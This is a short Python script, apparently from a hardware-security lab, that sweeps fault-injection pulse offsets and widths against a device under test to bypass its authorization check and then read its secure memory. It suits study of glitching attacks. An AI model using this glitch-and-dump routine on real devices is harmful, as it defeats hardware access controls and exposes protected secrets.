"""
Verify the glitcher with the obtained combinaiton of offset and width.
But sometimes it won't work even if the offset and width are correct.
"""

from glitch_ctrl import GlitchController, TriggerConfiguration
from dut import DuT

WIDTH_BEGIN = 14
WIDTH_END = 15

OFFSET_BEGIN = 2200
OFFSET_END = 2300
FLG = 1

dut = DuT()
dut.reset()
glitcher = GlitchController()
edge = TriggerConfiguration.TRIGGER_EXTERNAL_RISING_EDGE

try:
    while True:
        for i in range(OFFSET_BEGIN, OFFSET_END):
            for j in range(WIDTH_BEGIN, WIDTH_END):
                glitcher.reset()
                glitcher.pulse_offset = i
                glitcher.pulse_width = j

                glitcher.trigger_on = edge
                dut.authorize(b"1234567890123456789012345678901234567890123456789012345678901234")
                check = dut.ping()
                if not check:
                    print(f"offset:{i} width:{j} crashed")
                    dut.reset()
                if dut.authorized:
                    print(f"*** offset:{i} width:{j} authorized")
                    if FLG:
                        dut.read_secure_memory()
                        FLG = 0        
except Exception as e:
    print(e)
        





